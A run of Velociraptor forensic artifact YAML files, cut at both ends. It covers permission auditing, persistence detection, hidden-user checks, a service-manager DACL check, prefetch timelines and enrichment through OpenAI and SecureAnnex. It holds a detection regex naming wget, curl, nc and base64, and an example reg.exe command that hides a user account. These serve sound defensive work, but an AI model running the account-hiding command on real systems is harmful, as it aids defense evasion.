    and have file permissions set to 644, and group permissions set to 755.
    The files under /etc matching "?shadow*" are still expected to be owned by
    root, since the override for user is empty, but the group is no longer
    expected to be "root", but "shadow". File permissions should be "640"
    instead of "644". Note that this is an example and will most likely return
    hits, since a number of files in /etc have different owners and modes.

    "User" may either be an integer (UID) or a string (username). "Group"
    may be either an integer (GID) or a string (group name). The names for all
    UIDs and GIDs are looked up and displayed along with their IDs in the result.

    Modes may be specified in either octal numbers or strings.

    Modes specified in octal numbers, e.g. 755, 640, 1777, are matched
    using a regular expression, so that both "0640", "640" and "100640" matches
    "100640". An implicit anchor, '$', is used to match against the end of the
    octal mode string.

    When using mode strings (NumericMode unchecked), modes take the format
    "-rwx-r-x-r-x". Regex comparison is used, and an implicit '$' anchor
    is inserted at the end of the string. String modes allows for verifying only
    certain bits of permissions, like ensuring that only the owner has write 
    access, no one has permission to execute, but read access is not important:
    "r.-.--.--". Or ensuring that SUID/GUID is not set. For finding files
    specifically with SUID set, look at Linux.Sys.SUID.

    Mixing both formats is not supported and will result in unexpected results.

    This artifact can also be used to look for all files owned by root with
    world-writable permissions, for instance. Uncheck NumericMode, add a glob,
    select "root" as owner and enter any invalid permission string in UserMode.
    This will return every file owned by root. In the notebook, add something
    like "WHERE Mode=~'w.$'" to the query. The User field may also be empty,
    essentially returning every file in the glob as long as the UserMode field
    contains an invalid value. This turns this artifact into a file finder-like
    tool with metadata like username and group names for further processing.

    The following columns are returned:

      - OSPath
      - IsDir
      - UID
      - User
      - EUser (expected user from FilesToInspect)
      - GID
      - Group
      - EGroup (expected group from FilesToInspect)
      - Mode (file/directory mode/permissions)
      - EMode (expected file/directory mode from FilesToInspect)
      - Mismatch (a comma-separated string of one or several of "uid", "gid" and "mode")
      - Mtime
      - Ctime
      - Atime

    Note that the artifacts used to look up usernames and group names use the
    files /etc/passwd and /etc/group. You will have to modify this artifact to
    use `getent passwd`/`getent group` to use NSS and get users and groups from
    Active Directory etc.

    The provided default values in FilesToInspect is an example only.

parameters:
  - name: FilesToInspect
    type: csv
    default: |
        Globs,User,Group,FileMode,DirMode
        /etc/passwd?,root,root,644,
        /etc/?shadow?,root,shadow,640,
        /etc/group?,root,root,,
    description: The files to investigate. The default is just an example.
  - name: NumericMode
    type: bool
    default: true
    description: |
        Whether modes should be interpreted, compared and presented as octal
        numbers (e.g. 640) rather than strings (e.g. -rw-rw-r--)
  - name: IncludeDirs
    type: bool
    description: Include directories
  - name: FollowLinks
    type: bool
    description: Inlcude all symlinks, even though they may interfere with the results

precondition: |
    SELECT OS From info() WHERE OS = 'linux'

sources:
    - name: Discrepancies
      query: |
        /* Passwd/group will be looked up a lot. Make it efficient: */
        LET Users <= memoize(query={
            SELECT int(int=Uid) AS UID, User FROM Artifact.Linux.Sys.Users()
        }, key='UID')
        LET Groups <= memoize(query={
            SELECT GID, Group FROM Artifact.Linux.Sys.Groups()
        }, key='GID')

        LET FindUser(uid) = get(item=Users, field=uid).User
        LET FindGroup(gid) = get(item=Groups, field=gid).Group
        LET StrIf(str) = if(condition=str, then=str(str=str))

        LET Files = SELECT OSPath, IsDir, ModeString,
            /* If the globs are specified in the correct order, picking the
               last item will get a correct override behaviour: */
            /* Filter out all empty strings and keep integers: */
            filter(list=enumerate(items=User), regex='.+')[-1] AS EUser,
            filter(list=enumerate(items=Group), regex='.+')[-1] AS EGroup,
            filter(list=enumerate(items=FileMode), regex='.+')[-1] AS FMode,
            filter(list=enumerate(items=DirMode), regex='.+')[-1] AS DMode
            /* globs() can of course take a list of globs, like FilesToInspect.Globs,
               but by using that approach, we would no longer be able to tie
               User, Group etc. to the individual globs: */
            FROM foreach(row={
                SELECT Globs AS _Globs, * FROM FilesToInspect
            }, query={
                SELECT OSPath, IsDir, User, Group, FileMode, DirMode,
                    Mode.String AS ModeString
                    FROM glob(globs=_Globs)
                    WHERE (IncludeDirs OR NOT IsDir) AND (NOT IsLink OR FollowLinks)
            })
            GROUP BY OSPath

        LET FilesInfo = SELECT * FROM foreach(row=Files, async=true, query={
            SELECT OSPath, Sys.Uid AS UID, Sys.Gid AS GID, if(condition=NumericMode,
                    then=format(format='%o', args=[Sys.Mode]), else=ModeString)
                AS Mode, Mtime, Atime, Ctime, EUser, EGroup, log(message='%v, %v, %v', args=[Sys.Mode, ModeString, FMode]), StrIf(str=FMode) AS FMode,
                StrIf(str=DMode) AS DMode, IsDir
                FROM stat(filename=OSPath)
            })
            GROUP BY OSPath

        LET _UIDFiltered = SELECT OSPath, IsDir,
            UID,
            EUser,
            GID, FindGroup(gid=GID) AS Group,
            null AS EGroup,
            'uid' AS Mismatch,
            Mode,
            null AS EMode,
            Mtime, Atime, Ctime,
            get(item=Users, field=UID) AS _u
            FROM FilesInfo
            WHERE EUser AND _u.UID=UID AND
                /* User can be either an ID or a string: */
                if(condition=EUser=~'^\\d+$', then=EUser!=UID,
                            else=EUser!=_u.User)

        LET _GIDFiltered = SELECT OSPath, IsDir,
            UID, FindUser(uid=UID) AS User,
            EUser,
            GID,
            EGroup,
            'gid' AS Mismatch,
            Mode,
            null AS EMode,
            Mtime, Atime, Ctime,
            get(item=Groups, field=GID) AS _g
            FROM FilesInfo
            WHERE EGroup AND _g.GID=GID AND
                if(condition=EGroup=~'^\\d+$', then=EGroup!=GID,
                            else=EGroup!=_g.Group)

        LET _FileModeFiltered = SELECT OSPath, IsDir,
            UID, FindUser(uid=UID) AS User,
            EUser,
            GID, FindGroup(gid=GID) AS Group,
            EGroup,
            'mode' AS Mismatch,
            Mode,
            FMode AS EMode,
            Mtime, Atime, Ctime
            FROM FilesInfo
            WHERE NOT IsDir AND FMode AND NOT Mode=~FMode+'$'

        LET _DirModeFiltered = SELECT OSPath, IsDir,
            UID, FindUser(uid=UID) AS User,
            EUser,
            GID, FindGroup(gid=GID) AS Group,
            EGroup,
            'mode' AS Mismatch,
            Mode,
            DMode AS EMode,
            Mtime, Atime, Ctime
            FROM FilesInfo
            WHERE IsDir AND DMode AND NOT Mode=~DMode+'$'

        SELECT OSPath, IsDir, UID, User, EUser, GID, Group, EGroup, Mode, EMode,
            join(array=enumerate(items=Mismatch), sep=',') AS Mismatch,
            Mtime, Atime, Ctime
        FROM chain(a={
            SELECT OSPath, IsDir, UID, _u.User AS User, EUser,
            GID, Group, EGroup, Mode, EMode,
            join(array=enumerate(items=Mismatch), sep=',') AS Mismatch,
            Mtime, Atime, Ctime
            FROM _UIDFiltered
            GROUP BY OSPath
        }, b={
            SELECT OSPath, IsDir, UID, User, EUser, GID, _g.Group AS Group,
            EGroup, Mode, EMode,
            join(array=enumerate(items=Mismatch), sep=',') AS Mismatch,
            Mtime, Atime, Ctime
            FROM _GIDFiltered
            GROUP BY OSPath
        }, c={
            SELECT OSPath, IsDir, UID, User, EUser, GID, Group, EGroup, Mode, EMode,
            join(array=enumerate(items=Mismatch), sep=',') AS Mismatch,
            Mtime, Atime, Ctime
            FROM _FileModeFiltered
            GROUP BY OSPath
        }, d={
            SELECT OSPath, IsDir, UID, User, EUser, GID, Group, EGroup, Mode, EMode,
            join(array=enumerate(items=Mismatch), sep=',') AS Mismatch,
            Mtime, Atime, Ctime
            FROM _DirModeFiltered
            GROUP BY OSPath
        })
        GROUP BY OSPath
        ORDER BY OSPath

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Collection.Aftermath.yaml
======
name: MacOS.Collection.Aftermath
author: Wes Lambert -- @therealwlambert
description: |
    This is a simple artifact that leverages Afermath to collect many different forensic artifacts from a macOS host, then uploads the results to the Velociraptor server.

    From the project's description:

    Aftermath is a Swift-based, open-source incident response framework.

    Aftermath can be leveraged by defenders in order to collect and subsequently analyze the data from the compromised host. Aftermath can be deployed from an MDM (ideally), but it can also run independently from the infected user's command line.

    https://github.com/jamf/aftermath
    
tools:
  - name: Aftermath
    url: https://github.com/Velocidex/Tools/raw/main/Aftermath/aftermath
    serve_locally: true
parameters:
  - name: Analyze
    description: Analyze the collected data using the native --analyze option. This produces a ZIP file with summary information based on the analysis. If not chosen, the raw data will be uploaded.
    default: F
    type: bool
    
precondition: SELECT OS From info() where OS = 'darwin'

sources:
  - query: |
        LET AM <= SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="Aftermath", IsExecutable=TRUE)
        LET TmpDir <= tempdir(remove_last=TRUE)
        Let RunIt = SELECT *
                    FROM execve(argv=[
                        AM.FullPath[0],
                        "-o", TmpDir, 
                        "--deep"
                     ])
        LET AnalyzeIt = SELECT *
                    FROM execve(argv=[
                        AM.FullPath[0], "--analyze", grok(data=RunIt.Stdout,grok=["Aftermath archive moved to %{DATA:File}.zip"]).File + '.zip'
                     ]) 
        SELECT upload(accessor="file", file=grok(data=Stdout,grok=["Aftermath archive moved to %{DATA:File}.zip"]).File + '.zip') AS Upload FROM if(condition=Analyze, then=AnalyzeIt, else=RunIt)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Forensics.EnvironmentVariables.yaml
======
name: Linux.Forensics.EnvironmentVariables
author: Idan Beit-Yosef @ ibyf0r3ns1cs
description: |
  This artifact detects potential persistence mechanisms on Linux systems by analyzing environment variable files and login scripts.  
  
  **MITRE ATT&CK**: [T1546.004](https://attack.mitre.org/techniques/T1546/004/)

reference:
  - https://unit42.paloaltonetworks.com/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/
  - https://intezer.com/blog/research/kaiji-new-chinese-linux-malware-turning-to-golang/
  - https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect
  - https://www.anomali.com/blog/pulling-linux-rabbit-rabbot-malware-out-of-a-hat
  - https://blog.sucuri.net/2018/05/shell-logins-as-a-magento-reinfection-vector.html

parameters:
  - name: LinuxEnvGlobs
    type: csv
    default: |
      Glob
      /home/*/.bashrc
      /home/*/.bash_profile
      /home/*/.bash_login
      /home/*/.profile
      /home/*/.zshrc
      /etc/profile
      /etc/environment
      /home/*/.bash_logout
    
  - name: LoginScriptGlobs
    type: csv
    default: |
        Glob
        /etc/profile.d/*.sh
    
  - name: LinuxEnvModifiers
    default: ^(export|alias)
    type: regex
    
  - name: LinuxEnvNetworkUtils
    default: wget|curl|scp|ssh|nc\s|/usr/bin/nc\s|/bin/nc\s|https?://[^\s]*
    type: regex
    
  - name: LinuxEnvScripting
    default: python|perl|ruby|php|base64
    type: regex
    
precondition: SELECT OS From info() where OS = 'linux'

sources:
    - name: ModifierDetection
      query: |
        LET EnvFiles = SELECT OSPath FROM glob(globs=LinuxEnvGlobs.Glob)
        SELECT * FROM foreach(row=EnvFiles,
            query={
                SELECT Line, OSPath FROM parse_lines(filename=OSPath)
                WHERE
                    Line =~ LinuxEnvModifiers
            })

    - name: NetworkUtilsDetection
      query: |
        LET EnvFiles = SELECT OSPath FROM glob(globs=LinuxEnvGlobs.Glob)
        SELECT * FROM foreach(row=EnvFiles,
            query={
                SELECT Line, OSPath FROM parse_lines(filename=OSPath)
                WHERE
                    Line =~ LinuxEnvNetworkUtils
            })
    
    - name: ScriptingDetection
      query: |
        LET EnvFiles = SELECT OSPath FROM glob(globs=LinuxEnvGlobs.Glob)
        SELECT * FROM foreach(row=EnvFiles,
            query={
                SELECT Line, OSPath FROM parse_lines(filename=OSPath)
                WHERE
                    Line =~ LinuxEnvScripting
            })
            
    - name: LoginScriptsDetection
      query: |
        SELECT OSPath,upload(file=OSPath) AS Upload FROM glob(globs=LoginScriptGlobs.Glob)

        
column_types:
- name: Upload
  type: preview_upload

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Utils.BackupAzure.yaml
======
name: Server.Utils.BackupAzure
description: |
   This server monitoring artifact will automatically zip and backup
   any collected artifacts to Azure blob storage.

   You will need to provide a SasURL to upload to the container. The
   credentials can be given as parameters or they will be taken from
   the server metadata.
   
   Based on Server.Utils.BackupS3.

   Thanks to @shortxstack and @Recon_InfoSec

type: SERVER_EVENT

parameters:
   - name: ArtifactNameRegex
     default: "."
     description: A regular expression to select which artifacts to upload
     type: regex

   - name: SasURL
     description: A SAS URL to use for upload to the container.

   - name: RemoveDownloads
     type: bool
     description: If set, remove the flow export files after upload
     
   - name: UploadSubdirectory
     default: FALSE
     type: bool
     description: If set, upload exports to subirectory per flow

sources:
  - query: |
      -- Allow these settings to be set by the artifact parameter or the server metadata.
      LET sas_url <= if(condition=SasURL, then=SasURL,
           else=server_metadata().DefaultSasURL)

      LET completions = SELECT *,
         client_info(client_id=ClientId).os_info.fqdn AS Fqdn,
         create_flow_download(client_id=ClientId,
             flow_id=FlowId, wait=TRUE) AS FlowDownload
      FROM watch_monitoring(artifact="System.Flow.Completion")
      WHERE Flow.artifacts_with_results =~ ArtifactNameRegex
    
      SELECT upload_azure(
      file=FlowDownload,
      accessor="fs",
      sas_url=sas_url,
      name=if(condition=UploadSubdirectory, 
                then=format(format="%v/Host %v %v %v.zip",args=[FlowId, Fqdn, FlowId, timestamp(epoch=now())]),
                else=format(format="Host %v %v %v.zip",args=[Fqdn, FlowId, timestamp(epoch=now())]))
      ) AS Upload

      FROM completions
      WHERE Upload OR
        if(condition=RemoveDownloads,
           then=rm(filename=file_store(path=FlowDownload)))

---END OF FILE---

======
FILE: /content/exchange/artifacts/HiddenUsers.yaml
======
name: Windows.Registry.HiddenUsers
description: |
    Find hidden user accounts through registry values on the filesystem.

    In Windows, adversaries may hide user accounts via settings in the Registry. 
    For example, an adversary may add a value to the Windows Registry 
    (via Reg or other means) that will hide the user "test" from 
    the Windows login screen: 
    
    reg.exe ADD 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' /v test /t REG_DWORD /d 0 /f.

    * ATT&CK tactic: Defense Evasion, Hide Artifacts: Hidden Users
    * ATT&CK technique: T1564.002

reference:
  - https://attack.mitre.org/techniques/T1564/002/
  - https://github.com/Res260/conti_202202_leak_procedures/blob/main/12_using_anydesk.txt
  
type: CLIENT

author: Eduardo Mattos - @eduardfir

precondition:
  SELECT * FROM info() where OS = 'windows'

parameters:
  - name: SearchRegistryGlob
    default: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist\**
    description: Use a glob to define the keys that will be searched.

sources:
  - query: |
        SELECT  Name,
                FullPath,
                Data,
                Sys,
                ModTime as Modified
        FROM glob(globs=SearchRegistryGlob, accessor='registry')

column_types:
  - name: Modified
    type: timestamp

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Import.WatchS3Directory.yaml
======
name: Server.Import.WatchS3Directory
description: |
   This is an artifact that will monitor an S3 path for collections, 
   which it will then ingest. 

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT
type: SERVER_EVENT

parameters:
   - name: WatchDir
     default: "/velociraptor/*.zip"

   - name: Endpoint
     default: 'http://127.0.0.1:9000/'
     
   - name: Key
     default: 'admin'
     
   - name: Secret
     default: 'password'
     
   - name: Region
     default: 'us-east-1'

sources:
  - query: |
        LET S3_CREDENTIALS <= dict(
            endpoint=Endpoint, 
            credentials_key=Key, 
            credentials_secret=Secret,
            region=Region,
            no_verify_cert=1)
        SELECT * FROM foreach(
            row={
                SELECT * FROM diff(
                    query={
                        SELECT OSPath FROM glob(globs=WatchDir, accessor="s3")
                    }, period=3, key="OSPath"
                )
                WHERE Diff =~ "added"
            }, query={
                SELECT *, import_collection(
                    filename=OSPath,
                    accessor="s3"
                ),  OSPath 
                FROM scope()
            }
        )

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Detection.ScmanagerBackdoor.yaml
======
name: Windows.Detection.ScmanagerBackdoor
author: ACEResponder.com
description: |
   Checks for overly permissive DACLs on scmanager. Low priv Users with
   KA - SDDL_KEY_ALL could launch SYSTEM services. 

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        LET ps = '''
        $sid_const_json = '{"AA":"SDDL_ACCESS_CONTROL_ASSISTANCE_OPS",
        "AC":"SDDL_ALL_APP_PACKAGES",
        "AN":"SDDL_ANONYMOUS",
        "AO":"SDDL_ACCOUNT_OPERATORS",
        "AP":"SDDL_PROTECTED_USERS",
        "AU":"SDDL_AUTHENTICATED_USERS",
        "BA":"SDDL_BUILTIN_ADMINISTRATORS",
        "BG":"SDDL_BUILTIN_GUESTS",
        "BO":"SDDL_BACKUP_OPERATORS",
        "BU":"SDDL_BUILTIN_USERS",
        "CA":"SDDL_CERT_SERV_ADMINISTRATORS",
        "CD":"SDDL_CERTSVC_DCOM_ACCESS",
        "CG":"SDDL_CREATOR_GROUP",
        "CN":"SDDL_CLONEABLE_CONTROLLERS",
        "CO":"SDDL_CREATOR_OWNER",
        "CY":"SDDL_CRYPTO_OPERATORS",
        "DA":"SDDL_DOMAIN_ADMINISTRATORS",
        "DC":"SDDL_DOMAIN_COMPUTERS",
        "DD":"SDDL_DOMAIN_DOMAIN_CONTROLLERS",
        "DG":"SDDL_DOMAIN_GUESTS",
        "DU":"SDDL_DOMAIN_USERS",
        "EA":"SDDL_ENTERPRISE_ADMINS",
        "ED":"SDDL_ENTERPRISE_DOMAIN_CONTROLLERS",
        "EK":"SDDL_ENTERPRISE_KEY_ADMINS",
        "ER":"SDDL_EVENT_LOG_READERS",
        "ES":"SDDL_RDS_ENDPOINT_SERVERS",
        "HA":"SDDL_HYPER_V_ADMINS",
        "HI":"SDDL_ML_HIGH",
        "IS":"SDDL_IIS_USERS",
        "IU":"SDDL_INTERACTIVE",
        "KA":"SDDL_KEY_ADMINS",
        "LA":"SDDL_LOCAL_ADMIN",
        "LG":"SDDL_LOCAL_GUEST",
        "LS":"SDDL_LOCAL_SERVICE",
        "LU":"SDDL_PERFLOG_USERS",
        "LW":"SDDL_ML_LOW",
        "ME":"SDDL_ML_MEDIUM",
        "MP":"SDDL_ML_MEDIUM_PLUS",
        "MU":"SDDL_PERFMON_USERS",
        "NO":"SDDL_NETWORK_CONFIGURATION_OPS",
        "NS":"SDDL_NETWORK_SERVICE",
        "NU":"SDDL_NETWORK",
        "OW":"SDDL_OWNER_RIGHTS",
        "PA":"SDDL_GROUP_POLICY_ADMINS",
        "PO":"SDDL_PRINTER_OPERATORS",
        "PS":"SDDL_PERSONAL_SELF",
        "PU":"SDDL_POWER_USERS",
        "RA":"SDDL_RDS_REMOTE_ACCESS_SERVERS",
        "RC":"SDDL_RESTRICTED_CODE",
        "RD":"SDDL_REMOTE_DESKTOP",
        "RE":"SDDL_REPLICATOR",
        "RM":"SDDL_RMS__SERVICE_OPERATORS",
        "RO":"SDDL_ENTERPRISE_RO_DCs",
        "RS":"SDDL_RAS_SERVERS",
        "RU":"SDDL_ALIAS_PREW2KCOMPACC",
        "SA":"SDDL_SCHEMA_ADMINISTRATORS",
        "SI":"SDDL_ML_SYSTEM",
        "SO":"SDDL_SERVER_OPERATORS",
        "SS":"SDDL_SERVICE_ASSERTED",
        "SU":"SDDL_SERVICE",
        "SY":"SDDL_LOCAL_SYSTEM",
        "UD":"SDDL_USER_MODE_DRIVERS",
        "WD":"SDDL_EVERYONE",
        "WR":"SDDL_WRITE_RESTRICTED_CODE"}'
        
        $sid_const = ConvertFrom-Json $sid_const_json
        
        $ace = ((& (Get-Command "$($env:SystemRoot)\System32\sc.exe") @('sdshow', 'scmanager'))[1])
        $dacl_string = [regex]::match($ace, '.*D:(.*)S:').Groups[1].value
        $dacls = [regex]::match($dacl_string, '(?:\(([^\)]*?)\))+').Groups[1].Captures
        foreach ($dacl in $dacls) {
          $descriptors = $dacl.Value.split(';')
          $ace_type = $descriptors[0]
          $rights = $descriptors[2] -split '(\w{2})'
          $acct_sid = $descriptors[5]
          if ($ace_type -eq 'A' -and $rights -contains 'KA' -and $acct_sid -notin $('BA', 'DA', 'EA', 'LA', 'SY')) {
            $output = New-Object PSObject -Property @{
              dacl    = $dacl.Value;
              sid     = $acct_sid;
              message = '';
            }
            if ($acct_sid.Length -eq 2) {
              $output.message = 'Suspicious scmanager DACL identified. Users with ' + ($sid_const | select -ExpandProperty $acct_sid) + ' can start SYSTEM services.'
                    
            }
            else {
              $output.message = 'Suspicious scmanager DACL identified. User with SID ' + $acct_sid + ' can start SYSTEM services.'
            }
            $output | ConvertTo-Json
          }
        
        }
        
        '''

        SELECT * FROM execve(argv=["Powershell", "-ExecutionPolicy",
            "unrestricted", "-c", ps])   

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Timeline.Prefetch.Improved.yaml
======
name: Windows.Timeline.Prefetch.Improved
author: Matt Green - @mgreen27
description: |
  NOTE: This is a fixed version of Windows.Timeline.Prefetch which is
  available in the release binary after 0.7.0-3.

  Windows keeps a cache of prefetch files. When an executable is run,
  the system records properties about the executable to make it faster
  to run next time. By parsing this information we are able to
  determine when binaries are run in the past. On Windows10 we can see
  the last 8 execution times and creation time (9 potential executions).

  This artifact is a timelined output version of the standard Prefetch
  artifact. There are several parameter's availible.
    - dateAfter enables search for prefetch evidence after this date.
    - dateBefore enables search for prefetch evidence before this date.
    - binaryRegex enables to filter on binary name, e.g evil.exe.
    - hashRegex enables to filter on prefetch hash.

reference:
  - https://www.forensicswiki.org/wiki/Prefetch

parameters:
    - name: prefetchGlobs
      default: C:\Windows\Prefetch\*.pf
    - name: dateAfter
      description: "search for events after this date. YYYY-MM-DDTmm:hh:ssZ"
      type: timestamp
    - name: dateBefore
      description: "search for events before this date. YYYY-MM-DDTmm:hh:ssZ"
      type: timestamp
    - name: binaryRegex
      description: "Regex of executable name."
      type: regex
    - name: hashRegex
      description: "Regex of prefetch hash."
      type: regex

precondition: SELECT OS From info() where OS = 'windows'

sources:
  - query: |

      LET hostname <= SELECT Fqdn FROM info()

      SELECT  LastRunTimes as event_time,
              hostname.Fqdn[0] as hostname,
              "Prefetch" as parser,
              message,
              OSPath as source,
              Executable as file_name,
              CreationTime as prefetch_ctime,
              ModificationTime as prefetch_mtime,
              FileSize as prefetch_size,
              Hash as prefetch_hash,
              Version as prefetch_version,
              PrefetchFileName as prefetch_file,
              RunCount as prefetch_count
      FROM foreach(
      row={
        SELECT *
        FROM Artifact.Windows.Forensics.Prefetch(
          prefetchGlobs=prefetchGlobs,
          dateAfter=dateAfter,
          dateBefore=dateBefore,
          binaryRegex=binaryRegex,
          hashRegex=hashRegex)
      },
      query={
        SELECT *
        FROM chain(a1={
           SELECT *
           FROM flatten(query={
            SELECT Executable,
                   FileSize,
                   Hash,
                   Version,
                   LastRunTimes,
                   "Evidence of Execution: " + Executable + format(
                      format=" Prefetch run count %v", args=RunCount) as message,
                   RunCount,
                   OSPath,
                   PrefetchFileName,
                   CreationTime,
                   ModificationTime,
                   Binary
            FROM scope()
          })
        }, b1={
            -- One more row for creation time
            SELECT Executable,
                   FileSize,
                   Hash,
                   Version,
                   CreationTime AS LastRunTimes,
                   "Evidence of Execution (Btime): " + Executable + format(
                      format=" Prefetch run count %v", args=RunCount) as message,
                   RunCount,
                   OSPath,
                   PrefetchFileName,
                   CreationTime,
                   ModificationTime,
                   Binary
            FROM scope()
        })
        -- This group by applies on only a single prefetch file to
        -- remove duplication with CreationTime
        GROUP BY LastRunTimes
      })
      ORDER BY event_time

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Files.FileMonitor.yaml
======
name: MacOS.Files.FileMonitor
author: Wes Lambert -- @therealwlambert
description: |
   This artifact parses Objective-See's FileMonitor log.
   
   More information about Objective-See and FileMonitor can be found here:
   
   https://objective-see.org/products/utilities.html

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT
type: CLIENT

parameters:
   - name: JSONLGlob
     default:
   - name: FileRegex
     description: "Filter on file name"
     default: .
     type: regex
   - name: PathRegex
     description: "Filter on path name"
     default: .
     type: regex
   - name: ProcessRegex
     description: "Filter on process name"
     default: .
     type: regex
   - name: UserIdRegex
     description: "Filter on user ID"
     default: .
     type: regex
   
sources:

  - precondition:
      SELECT OS From info() where OS = 'windows' OR OS = 'linux' OR OS = 'darwin'

    query: |
      LET FileMonitorLogs <= SELECT FullPath FROM glob(globs=JSONLGlob)
      
        
      SELECT * FROM foreach(row={ 
        SELECT * FROM parse_jsonl(filename=FileMonitorLogs.FullPath)}, query={
            SELECT 
                timestamp(string=timestamp) AS Time,
                event AS Event,
                file.destination AS File,
                file.process.pid AS PID,
                file.process.name AS Process,
                file.process.path AS Path,
                file.process.uid AS UID,
                file.process.arguments AS Arguments,
                file.process.ppid AS `Parent PID`,
                file.process.ancestors AS Ancestors,
                file.process.`signing info (reported)` AS `Signing Info (Reported)`,
                file.process.`signing info (computed)` AS `Signing Info (Computed)`,
                file AS _Content
            FROM scope()
            WHERE File =~ FileRegex
            AND Path =~ PathRegex
            AND Process =~ ProcessRegex
            AND str(str=UID) =~ UserIdRegex
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Forensics.SoftPerfectNetworkScanner.yaml
======
name: Windows.Forensics.SoftPerfectNetworkScanner
description: |
   This Velociraptor artifact is tailored for forensic analysis of SoftPerfect Network Scanner (NetScan) usage on Windows platforms. This facilitates the identification of how SoftPerfect Network Scanner was configured and used, aiding in DFIR investigations. It parse the MFT to search and retrieve the content of two files:
   
   - netscan.lic: display information related to the program's graphical user interface language configuration and license details, including the license name for example
   - netscan.xml: display information regarding the tool's configuration (selected scan ports, history of scanned IP ranges...)
author: Julien Houry - @y0sh1mitsu (CSIRT Airbus Protect), Matt Green - @mgreen27 (ntfs performance update)

parameters:
  - name: AllDrives
    type: bool
    description: "Select MFT search on all attached ntfs drives."
    
reference:
 - https://www.protect.airbus.com/blog/uncovering-cyber-intruders-a-forensic-deep-dive-into-netscan-angry-ip-scanner-and-advanced-port-scanner/
 - https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-259a
 - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-060a

type: CLIENT

precondition: SELECT OS From info() where OS = 'windows'

sources:
  - query: |
      SELECT 
        FileName,
        OSPath,
        Created0x10 as Btime,
        LastModified0x10 as Mtime,
        parse_xml(file=OSPath) AS ParsedXML 
      FROM Artifact.Windows.NTFS.MFT(FileRegex='^netscan\.(lic|xml)$',AllDrives=AllDrives)
      WHERE NOT OSPath =~ '''\\<Err>\\'''

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Enrichment.OpenAI.yaml
======
name: Server.Enrichment.AI.OpenAI
author: Matt Green - @mgreen27 refactored orginal from Wes Lambert - @therealwlambert|@weslambert@infosec.exchange
description: |
  Query OpenAI for analysis of data.
  
  Paramaters:
  
  * `PrePrompt` - Is System prompt default is: "You are a Cyber Incident 
  Responder and need to analyze data. You have an eye for detail and like to use 
  short precise technical language. Analyze the following data and provide 
  summary analysis:"  
  * `Prompt` - Is User prompt as string. When pushing a dict object via PromtData 
  good practice is add some strings related to the type of data for analysis or 
  artifact name to provide context.
  * `PromptData` - add optional object to be serialized and added to the User prompt.
  * `Model` - Model to use for your request.
  * `MaxPromptSize` - If set will cut the final prompt to this size in bytes to 
  assist maintaining context limits
  
  This artifact can be called from within another artifact (such as one looking 
  for files) to enrich the data made available by that artifact.
  
type: SERVER

parameters:
    - name: PrePrompt
      type: string
      description: |
        A prefix to be used with the prompt. For example, when asking 
        a question, then providing data separately
      default: |
        You are a Cyber Incident responder and need to analyse forensic 
        collections. You have an eye for detail and like to use short precise 
        technical language. Your PRIMARY goal is to analyse the following data 
        and provide summary analysis -
    - name: Prompt
      type: string
      description: The data sent to OpenAI
      default: "what is prefetch?"
    - name: PromptData
      type: string
      description: The data sent to OpenAI - this data is serialised and added to the prompt
    - name: Model
      type: string
      description: The model used for processing the prompt
      default: gpt-4o
    - name: OpenAIToken
      type: string
      description: Token for OpenAI. Leave blank here if using server metadata store.
    - name: MaxPromptSize
      type: int
      description: Will limit your prompt to this size in bytes. Helps maintain context sizes.

sources:
  - query: |
        LET Creds <= if(
            condition=OpenAIToken,
            then=OpenAIToken,
            else=server_metadata().OpenAIToken)
            
        LET UserPrompt = if(condition= MaxPromptSize, 
                                then = (Prompt + " " + serialize(item=PromptData))[:MaxPromptSize],
                                else = Prompt + " " + serialize(item=PromptData) )
        LET messages = (dict(role="system",content=PrePrompt), dict(role='user',content=UserPrompt))
        LET headers = dict(`Authorization`='Bearer ' + Creds, `Content-Type`="application/json")

        SELECT 
            PrePrompt as SystemPrompt,
            UserPrompt,
            parse_json(data=Content).choices[0].message.content AS ResponseText,
            parse_json(data=Content) AS ResponseDetails
        FROM http_client(
            url='https://api.openai.com/v1/chat/completions',
            headers=dict(`Authorization`='Bearer ' + Creds, `Content-Type`="application/json"),
            method="POST",
            data=dict(model=Model, messages=messages)
        )

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Enrichment.SecureAnnex.yaml
======
name: Server.Enrichment.SecureAnnex
author: Whitney Champion -- bsky.app/profile/whit.zip
description: |
  Submit an extension to the Secure Annex API.

  https://app.secureannex.com/settings/api

  This artifact can be called from within another artifact, like one looking for installed Chrome extensions, to enrich the data coming back with vulnerability information from Secure Annex.
  
  Ex.

    `SELECT * from Artifact.Server.Enrichment.SecureAnnex(ExtensionId=$EXTENSION_ID,ExtensionVersion=$EXTENSION_VERSION,ApiKey=$API_KEY)`


type: SERVER

parameters:
    - name: ExtensionId
      type: string
      description: The extension ID to submit to SecureAnnex
    - name: ExtensionVersion
      type: string
      description: The extension version to submit to SecureAnnex
    - name: ApiKey
      type: string
      description: The API key to submit to SecureAnnex
      default: 
    - name: ApiURL
      type: string
      description: The SecureAnnex API URL
      default: https://api.secureannex.com/api/v0/vulnerabilities

sources:
  - query: |
        // Get the JSON response from the API call
        LET Response = SELECT parse_json(data=Content).result AS Vulnerabilities
            FROM http_client(url=ApiURL, 
            headers=dict(`x-api-key`=ApiKey), 
